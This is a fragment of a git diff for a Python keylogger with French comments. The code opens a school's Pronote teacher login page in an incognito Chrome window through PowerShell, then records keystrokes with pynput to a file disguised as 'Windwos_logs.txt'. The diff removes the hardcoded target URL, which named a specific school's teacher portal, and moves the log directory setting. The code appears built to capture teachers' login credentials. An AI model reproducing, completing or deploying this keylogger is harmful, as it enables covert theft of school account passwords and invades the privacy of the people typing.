@@ -2,7 +2,9 @@ from pynput.keyboard import Key, Listener, Controller
 import logging, time , winreg, os, shlex, webbrowser, pynput
 from os import system 
 
-site_web = "https://3510023t.index-education.net/pronote/professeur.html" #Lien du site qui s'ourvira au début
+site_web = "" #Lien du site qui s'ourvira au début
+log_dir = r"" #repertoire dans lequel les keylogs sont sauvgardées
+
 #En cours developpement
 result = None
 if winreg:
@@ -26,9 +28,6 @@ print(result+" %s")
 webbrowser.get(result+" %s").open(site_web)
 #ouvre la page chrome avec le site fourni (ligne5) en déconectant l'utilisateur.
 system("powershell -C Start-Process chrome.exe -ArgumentList @( '-incognito', '"+site_web+"' )")
-
-#repertoire dans lequel les keylogs sont sauvgardées
-log_dir = r"Logs\\"
 
 #keylogger
 logging.basicConfig(filename=(log_dir + "Windwos_logs.txt"), \
